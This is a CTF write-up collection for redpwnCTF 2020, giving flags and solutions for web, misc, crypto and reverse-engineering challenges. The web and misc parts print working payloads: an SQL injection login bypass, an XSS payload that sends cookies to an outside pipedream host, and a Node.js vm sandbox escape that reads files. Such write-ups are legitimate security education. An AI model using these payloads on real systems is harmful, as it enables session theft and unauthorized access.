# Table of Contents
- [web](#web)
  - [Inspector-General](#inspector-general)
  - [Login](#login)
  - [Static-Pastebin](#static-pastebin)
- [misc](#misc)
  - [Uglybash](#uglybash)
  - [CaaSiNO](#caasino)
- [crypto](#crypto)
  - [12 Shades of redpwn](#12-shades-of-redpwn)
  - [Itsy Bitsy](#itsy-bitsy)
- [rev](#rev)
  - [Bubbly](#bubbly)
  - [Ropes](#ropes)
---

# web

## inspector-general

### Flag
```
flag{1nspector_g3n3ral_at_w0rk}
```

### Solution
Inspect page elements, flag is there
```
<meta name="redpwnctf2020" content="flag{1nspector_g3n3ral_at_w0rk}">
```

## login

### Flag
```
flag{0bl1g4t0ry_5ql1}
```

### Solution
By analyzing the [source code given](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/web/login/index.js), we see that there is no sanitization over username and password when doing the SQL query, and if something a result is returned by the query, the page will print the flag.

Use basic SQL Injection in the password. comment end of query with -- (sqlite)

```
user: whatever_you_want
password: password' OR 1=1--
```

Pop-up with the flag appears

![SQLInjection done](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/web/login/screenshots/login_sqli.png)

---

## static-pastebin

### Flag
```
flag{54n1t1z4t10n_k1nd4_h4rd}
```

### Introduction
We are given a web page that accepts any kind of input, with a button that will "store" the text.

![User web page](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/web/static-pastebin/screenshots/store_text_page.png)

And a different website (an admin site) where the challenge recommends you place your link if you face any "issue"

![Admin web page](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/web/static-pastebin/screenshots/admin_oage.png)

### Solution
By looking at the [source code of the page](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/web/static-pastebin/first_script.js) that stores text we see that the link is then conformed by doing an `atob(text)`

When adding text and submitting the `Create` button, we can [analyze the second source](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/web/static-pastebin/second_script.js), which performs a sanitization over the text

Considering there is another admin page which needs the link to check for issues, we can try doing some kind of XSS. And most probably, the flag could be contained within the cookies

Looking with some more detail at the sanitization method, we can see that it looks for `< >` and only adds content if the brackets are balanced at that moment:

```javascript
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

So that one "couldn't" add something like:
```
<img src=x onerror="javascript:alert('XSS')"></img>
```

However, if we start the text with a closing bracket, then when it gets to the opening bracket everything will be "balanced". For example:
```
><img src=x onerror="javascript:alert('XSS')"></img>
```

We see that in fact we are able to sort out the sanitization. So we can build a more appropriate onerror callback so that it can send the cookies to a sink managed by us. For example:

```
><img src=x onerror="javascript:document.location='https://enoghoklyh418.x.pipedream.net/?c='+document.cookie"></img>
```

We can then generate the page, obtain the link that will look something like:
```
https://static-pastebin.2020.redpwnc.tf/paste/#Ij48aW1nIHNyYz14IG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZW5vZ2hva2x5aDQxOC54LnBpcGVkcmVhbS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWUiPjwvaW1nPg==
```

And place it in the admin page.

After a while, we'll see the incoming request to our controlled sink, with the cookies of the site containing the flag!

```
/?c=flag=flag{54n1t1z4t10n_k1nd4_h4rd}
```

# misc

## uglybash

### Flag
```
flag{us3_zsh,_dummy}
```

### Analysis & Solution
If we open the [script](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/misc/ugly-bash/cmd.sh), it's basically obfuscated code, so it'll be impossible to simply find the flag.

However, we can run the script in `DEBUG` mode with `-x` and it will print every line evaluation, along with the flag!

```
bash -x cmd.sh

...
+++ for VS2R4y in $[  (-(-(3${*~~}...
+++ printf %s y
+++ for VS2R4y in $[  (-(-(3${*~~}...
+++ printf %s '}'
```

Flag can be seen at the last line, or can be rebuilt looking at the printf commands

---

## CaaSiNO

### Flag
```
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```

### Introduction
By looking at the [javascript provided](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/misc/CaaSINO/calculator.js), we see that the code the "calculator" executes is running with `vm`, a lib used to execute JS code in Sandbox mode. (https://nodejs.org/api/vm.html)

So we're bsaically inside a NodeJSJail!

### Analysis & Solution
One of the first things we see when looking at the documentation is a disclaimer stating that the lib is not to be used as a security mechanism... So... There must be a way to escape from the context.

Searching a little bit for things like "nodejs vm escape" will provide a couple of existing links. The ones I used to help solve this callenge were:
1. [Escaping nodejs vm](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af)
2. [Escape NodeJS Sandboxes](https://blog.netspi.com/escape-nodejs-sandboxes/)

From resource 1, the most relevant thing is the ability to make an eval of a string on the Global context (not the sandbox one), by using  [(this.constructor.constructor(""))()](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af#file-escape-js-L48-L50)

So we can start playing with that. For example, if we look at `this` and its `process` variable, we can see that in Sandbox mode, it's `undefined`

```javascript
> this
[object Object]
> this.process
undefined
```

However, using the constructor escape...

```javascript
> (this.constructor.constructor("return this.process"))()
[object process]
```
**Bingo, we have a process!**

After this, since the challenge already provides a hint stating the location of the flag file, the first thing I tried was using common JS/nodeJS libs to read files. But it seems that we cannot do `require` of libs.

```javascript
> (this.constructor.constructor("var fs = require('fs'); return fs"))()
An error occurred.
> (this.constructor.constructor("var cp = require('child_process'); return cp"))()
An error occurred.
```

Reading now from [resource 2](https://blog.netspi.com/escape-nodejs-sandboxes/), I noticed a peculiar way of "importing" some libs using `process.binding('fs')`. So, let's try it!

```javascript
> (this.constructor.constructor("var fs = this.process.binding('fs'); return fs;"))()
[object Object]
```
Trying to load 'fs' returns something!

Apparently, NodeJS has the possibility of creating things on different languages (like C/C++) taking advantage of the language, and then binding it to it.
It seems that by default, there is a standard set of bindings that you can use in Node, which could be described using the `natives` binding:

```javascript
> (this.constructor.constructor("var n = this.process.binding('natives'); return Object.getOwnPropertyNames(n);"))()
_http_agent,_http_client,_http_common,_http_incoming,_http_outgoing,_http_server,_stream_duplex,_stream_passthrough,_stream_readable,_stream_transform,_stream_wrap,_stream_writable,_tls_common,_tls_wrap,assert,async_hooks,buffer,child_process,cluster,console,constants,crypto,dgram,dns,domain,events,fs,fs/promises,http,http2,https,inspector ...
```

We can see that `fs` is effectively among the possible bindings. `child_process` is mentioned as well, so I tried using it directly to execute os commands directly, but it fails. It would seem that not all the listed bindings are available to use:

```javascript
> (this.constructor.constructor("var c = this.process.binding('child_process'); return c;"))()
An error occurred.
```

So, I focused back on `fs`. Taking a look at the available properties, we can see a list of common methods

```javascript
> (this.constructor.constructor("var fs = this.process.binding('fs'); return Object.getOwnPropertyNames(fs);"))()
access,close,open,openFileHandle,read,readBuffers,fdatasync,fsync,rename,ftruncate,rmdir,mkdir,readdir,internalModuleReadJSON,internalModuleStat,stat,lstat,fstat,link,symlink,readlink,unlink,writeBuffer,writeBuffers,writeString,realpath,copyFile,chmod,fchmod,chown,fchown,lchown,utimes,futimes,mkdtemp,kFsStatsFieldsNumber,statValues,bigintStatValues,StatWatcher,FSReqCallback,FileHandle,kUsePromises

> (this.constructor.constructor("var fs = this.process.binding('fs'); return fs.open;"))()
function open() { [native code] }
```

And from resource #2, we can see these bindings are using os commands for [open](https://linux.die.net/man/2/open), [read](https://linux.die.net/man/2/read), etc.

So, from here we basically need to open the ctf flag file and read it!
Below is the code-recipe:

```javascript
var fs = this.process.binding('fs');
var readonly_flag = 0;
var mode = 0o666;
var fd  = fs.open('/ctf/flag.txt', readonly_flag, mode, undefined, {path: '/ctf/flag.txt'});
var buffer = Buffer.alloc(100);
fs.read(fd, buffer, 0, 100, -1, undefined, {});
return buffer;
```

In order to put the code-recipe together, I had to look on the source files of NodeJS on how fs was being used to open and read, so to understand the flags, mode, buffer, etc
- [fs lib](https://github.com/nodejs/node/blob/master/lib/fs.js)
- [buffer lib](https://github.com/nodejs/node/blob/master/lib/buffer.js)

Placing the command alltogether in a one-liner and running it...
```javascript
> (this.constructor.constructor("var fs = this.process.binding('fs');var readonly_flag = 0;var mode = 0o666;var fd  = fs.open('/ctf/flag.txt', readonly_flag, mode, undefined, {path: '/ctf/flag.txt'}); var buffer = Buffer.alloc(100); fs.read(fd, buffer, 0, 100, -1, undefined, {});return buffer;"))()

flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```
---

# crypto

## 12 Shades of redpwn

### Flag
```
flag{9u3ss1n9_1s_4n_4rt}
```

### Analysis done
We are handed to image files:
- [chipertext.jpg](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/crypto/12-shades-of-redpwn/chipertext.jpg)
- [color-wheel.jpg](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/crypto/12-shades-of-redpwn/color-wheel.jpg)

By looking at the color-wheel, we can see that each color from it can be found in the ciphertext image as well. And the hint states it looks like a clock, so let's give numbers to the ciphertext color boxes.

This will end up being:

```
86 90 81 87 A3 49 99 43 97 97 41 92 49 7B 41 97 7B 44 92 7B 44 96 98 A5
```

This looks like some kind of base encoding, and in particular could be base12 (considering the clock hint)

We check it with Python and...

```python
cipher = ['86', '90', '81', '87', 'A3', '49', '99', '43', '97', '97', '41', '92', '49', '7B', '41', '97', '7B', '44', '92', '7B', '44', '96', '98', 'A5']

''.join([chr(int(i, 12)) for i in cipher])

'flag{9u3ss1n9_1s_4n_4rt}'
```
---

## Itsy Bitsy

### Flag

```
flag{bits_leaking_out_down_the_water_spout}
```

### Introduction
Uppon connection, we are requested to inputs (i, j) and then the Ciphertext is printed:

```
$ nc 2020.redpwnc.tf 31284
Enter an integer i such that i > 0: 1
Enter an integer j such that j > i > 0: 2
Ciphertext: 0010001100001000111101011000000111010011000111100100101101011100110000011101110111100111100000010101101001000101001000011001010011010000101101010011110000011001110100000000000001000101000000001111011111110011100100010001100101111100011111011000010011000100010100100000001110000001010100010111110101010
```

### Analysis of the provided source code
Looking at the code provided, we see that those (i,j) inputs are being to calculate a `lower_bound` and an `uper_bound`:

```python
    ...
    lb = 2**i
    ub = 2**j - 1
```

And that those bounds are then used to generate a kind of "OTP" key, which is basically a random int between the bounds. In our first attempt (see above), with an input of (1,2) the key will be composed of `2s` and `3s`

```python
def generate_random_bits(lower_bound, upper_bound, number_of_bits):
    bit_str = ''
    while len(bit_str) < number_of_bits:
        r = randint(lower_bound, upper_bound)
        bit_str += bin(r)[2:]
    return bit_str[:number_of_bits]
```

Which is later XORed against the flag to generate the ciphertext:

```python
    ...
    encrypted_bits = bit_str_xor(flag_bits,random_bits)
    print(f'Ciphertext: {encrypted_bits}')
```

### 1 - Solution (The straightforward way)
There are two things to notice:
1. The ciphertext will probably begin with `flag{` and finish with `}`
1. When we used the inputs (1,2), the key was composed by `2s` and `3s`, so basically `10` and `11`, which we could say that is a string of `1X`s. This means that all even positions will always have a `1`

Now, the key to the challenge is basically in the second one, since it's how the xorKey is being built (Initially I didn't spend more time thinking on it and I basically jumped into a hurricane that took me to Oz)

So, when we think some more on how the xorKey is being built and what we can know from the input we send,what we do is request for the ciphertext using different `(i,j)`s variations up until the length of the ciphertext. For each new ciphertext we'll know how the key was conformed:

| j | key_format |
|---:|------------:|
| 2 | 1X |
| 3 | 1XX |
| 4 | 1XXX |
| 5 | 1XXXX |

We can even see that there is no need to ask for all j's less than the length of the ciphertext, we can ask only for those j's that are prime. (j=2 will cover for j=4 for example).

| j | key_format |
|---:|------------:|
| 2 | 1X |
| 3 | 1XX |
| 5 | 1XXXX |
| 7 | 1XXXXXX |
| ... | ... |

For each obtained ciphertext, we can XOR the bits we know and build the complete flag.

This can look like:

```python

def decipher():
    # list for illustration. no need to manually call for each prime number, can be done automatically
    ciphers = [
        #(j, ciphertext_obtained)
        (2, '00100111010110001011......'),
        (3, '01011011010110000011......'),
        (5, '00110011110100000011......'),
        (7, '00111110001110000101......'),
        (9, '01100000111101001010......'),
        ...
    ]

    partial_flags = []
    for n, cipher in ciphers:
        partial_flags.append(change_bits(cipher, n))

    final_flag = build_flag(partial_flags)
    print(final_flag)

# Aux methods
def change_bits(cipher, n):
    """For every known bit of the key (which is if the position is module of n) do the XOR against the cipher. For the rest of them, just leave a ? as placeholder"""
    f = ''
    for i in range(len(cipher)):
        if i % n == 0:
            f += bit_str_xor(cipher[i], '1')
        else:
            f += '?'

    return(f)

def build_flag(partial_flags):
    """Build final flag based on the known bits of the different partial flags"""
    final_flag = ''
    for i in range(len(flags[0])):
        bit = '?'
        for f in flags:
            if f[i] in ('0', '1'):
                bit = f[i]
                break

        final_flag += bit
```

**Running this, we'll decipher the flag**

```
flag{bits_leaking_out_down_the_water_spout}
```

> Complete code used to perform the automatic decipher [here](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/crypto/itsy-bitsy/1_straight_forward_solution/solution.py)

### 2 - Kind of a Solution (The jump into a hurricane that got me to Oz)
Ok, even though this is not the correct way to solve the challenge, it's the path that I took until I realized I messed up at some point along the way.
It's manual and it doesn't really get you the flag, more of like a possible combinations of flag.
Since I really enjoyed doing this, I might as well place this crazy kind of a solution here.

So, as I said earlier, if we looked at how the xorKey was being built and think some more, we would be able to then go asking for different `(i,j)`s variations, and therefore extending our "bit" knowledge of the flag. Well, that part is exatly were I messed up (ouch, so early in the game). I did saw that with `i: 1 & j: 2` the key was `1X`, but I stopped thinking there and went straightahead with that small piece of info.

Another thing that I knew was, from the flag sanitization, which characters were allowed in it; and that range always have the first bit in 1. So I split the "potential_flag" in bytes and checked the first bit. For those bytes that I didn't know the bit (`?`) I automatically placed a `1`

Basically, I ended up with a flag that had a little bit more than half the bits uncovered. Something that looked like:
```
potential_flag = '1100110110110011000011100111111101111?0?1?1?0?0?111?0?0?1?1?0?110?1?1?1?0?1?011?0?0?1?0?0?111?1?1?1?0?0?111?1?1?1?0?1?110?1?1?1?0?1?111?0?0?1?1?1?010?1?1?1?0?1?011?1?1?1?1?1?111?1?1?1?1?1?111?0?0?1?0?0?011?0?0?1?1?1?111?0?1?1?0?0?111?0?0?1?0?1?111?0?1?1?1?1?111?0?1?1?1?0?011?1?1?1?1?1?111?0?0?1111101'
```

Looking at the byte groups again, I noticed that at the very most, I was missing 3 bits per byte; and that, again, the byte needed to be under certain range and since it is a flag I could have a "filtered" list of possible chars. So, why not bruteforce it? hehe

For each byte, I run the 8 possible permutations of bits, and checked if the byte was in the possible character range and moreover if it was a letter or a number:

```
perms = (
    ('0','0','0'),
    ('1','0','0'),
    ('0','1','0'),
    ('1','1','0'),
    ('0','0','1'),
    ('1','0','1'),
    ('0','1','1'),
    ('1','1','1'),
)
possible_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.,'
```

Once I finished that evaluation, I had in my possesion all the possible combinations of chars to build the flag.

I noticed the `_` (underscore) in just some of the positions, which is ideal because it's the char used as a space in flags, and from that I tested a couple of intervals.

Now, in order to test the possible intervals, the amount of combinations with the letters was gigantic; however, I did notice that there were no numbers present in the possible chars for any position. This was good, because it meant that words weren't going to be written like `th1s 1s 4 w0rd` but more like `this is a word`.

Doing a little bit of research, I found [enchant](https://pyenchant.github.io/pyenchant/), a python lib that can load dictionaries and which you can check if a word is indeed part of the dictionary.

So with these last two things in mind, I run the combinations, filtering only those which were valid english words.

Because the list of words was pretty short, it left me with a human-eye possible puzzle to build potential phrases for the flag. This was the final puzzle table I got:

| [5:9] | [10:17] | [18:21] | [22:26] | [27:30] | [31:36] | [37:42] |
|-------|---------|---------|---------|---------|---------|---------|
| baas  | decking | eat     | down    | aha     | bates   | croup   |
| baps  | ducking | get     | noun    | the     | bides   | crowd   |
| bats  | fucking | gut     |         |         | biter   | group   |
| bias  | lacking | guv     |         |         | bites   | grout   |
| bids  | leaking | mat     |         |         | caper   | spout   |
| bits  | leaning | met     |         |         | capes   |         |
| cads  | lucking | oat     |         |         | capos   |         |
| caps  | necking | opt     |         |         | cater   |         |
| cats  |         | out     |         |         | ciaos   |         |
| city  |         |         |         |         | cider   |         |
| fads  |         |         |         |         | cites   |         |
| fats  |         |         |         |         | fades   |         |
| fits  |         |         |         |         | fates   |         |
| gads  |         |         |         |         | gapes   |         |
| gaps  |         |         |         |         | gates   |         |
| gits  |         |         |         |         | gator   |         |
| rads  |         |         |         |         | gites   |         |
| raps  |         |         |         |         | raper   |         |
| rats  |         |         |         |         | rapes   |         |
| rids  |         |         |         |         | rater   |         |
| rips  |         |         |         |         | rates   |         |
| saps  |         |         |         |         | rider   |         |
| sips  |         |         |         |         | rides   |         |
| sits  |         |         |         |         | riper   |         |
| vats  |         |         |         |         | rites   |         |
| vies  |         |         |         |         | sades   |         |
| wads  |         |         |         |         | sates   |         |
| wits  |         |         |         |         | scags   |         |
|       |         |         |         |         | scams   |         |
|       |         |         |         |         | scums   |         |
|       |         |         |         |         | sides   |         |
|       |         |         |         |         | sites   |         |
|       |         |         |         |         | vapes   |         |
|       |         |         |         |         | vapor   |         |
|       |         |         |         |         | viper   |         |
|       |         |         |         |         | wader   |         |
|       |         |         |         |         | wades   |         |
|       |         |         |         |         | water   |         |
|       |         |         |         |         | wider   |         |
|       |         |         |         |         | widow   |         |
|       |         |         |         |         | wiper   |         |
|       |         |         |         |         | wipes   |         |


Considering the challenge was about itsy-bitsy spider, I located a couple of words like `spout` `water` etc, which should have a very high success rate, and for the first word `bits` was there and I thought it was a shortname for our lovely spider.

I ended up building a funny flag, that was incorrect by 2 words:

```
flag{bits_fucking_get_down_the_water_spout}
```

And obviously, as I advanced with this logic I kept thinking "this probably isn't the way to solve it", because even when I reduced it to the last words, I still had to check combinations (because all the even positions could have the letter in minus. or mayus)

And that's when I decided to put a break on this and backtrack my mess up.

> Code leading to this point with the candidates and possible chars per position are located [here](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/crypto/itsy-bitsy/2_hurricane_to_oz_solution)

Anyway, it was fun :)

---

# rev

## Bubbly

### Flag

```
flag{4ft3r_y0u_put_u54c0_0n_y0ur_c011ege_4pp5_y0u_5t1ll_h4ve_t0_d0_th15_57uff}
```

### Introduction
We are provided with an [ELF file](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/pwn/bubbly/bubbly)

```
$ file bubbly
bubbly: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
```

And connecting to the specified remote prints:
```
$ nc 2020.redpwnc.tf 31039
I hate my data structures class! Why can't I just sort by hand?
```

### Analysis & Solution
Time to understand what that bubbly file is doing.

After opening it with Ghidra, we can check the dissasembly code provided, in particular for the main function:

```c
int main(void)
{
  ...
  while( true ) {
    __isoc99_scanf(&DAT_00102058);
    if (8 < i) break;
    nums[i] = nums[i] ^ nums[i + 1];
    nums[i + 1] = nums[i + 1] ^ nums[i];
    nums[i] = nums[i] ^ nums[i + 1];
    pass = check();
  }
  if (pass == false) {
    puts("Try again!");
  }
  else {
    puts("Well done!");
    print_flag();
  }
  return 0;
}
```

And also for the check function

```c
_Bool check(void)

{
  uint32_t i;
  _Bool pass;

  i = 0;
  while( true ) {
    if (8 < i) {
      return true;
    }
    if (nums[i + 1] < nums[i]) break;
    i = i + 1;
  }
  return false;
}
```

> You can see the full dissasembly code [here](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/pwn/bubbly/bubbly.c)

After doing some analysis, we can see that Bubbly is sorting an array by using... yes... bubble sort!

Looking for the array that needs to be sorted, we see that is being initialized as:

```
[1, 0xA, 3, 2, 5, 9, 8, 7, 4, 6]
```

So we can do any kind of sequence that ends up sorting it in bubble fashion. In particular, I used:
```
1234567814567456453
```

And with that sequence we obtain the flag:
```
Well done!
flag{4ft3r_y0u_put_u54c0_0n_y0ur_c011ege_4pp5_y0u_5t1ll_h4ve_t0_d0_th15_57uff}
```

---

## ropes

### Flag
```
flag{r0pes_ar3_just_l0ng_str1ngs}
```

### Solution
Using strings command over the [given file](https://github.com/s-rodriguez/ctfs/ctfs/redpwn2020/rev/ropes/ropes), gives you the flag

```
$ strings ropes

/usr/lib/libSystem.B.dylib
Give me a magic number:
First part is: flag{r0pes_ar3_
Second part is: just_l0ng_str1ngs}
@dyld_stub_binder
@_printf
@_puts
```
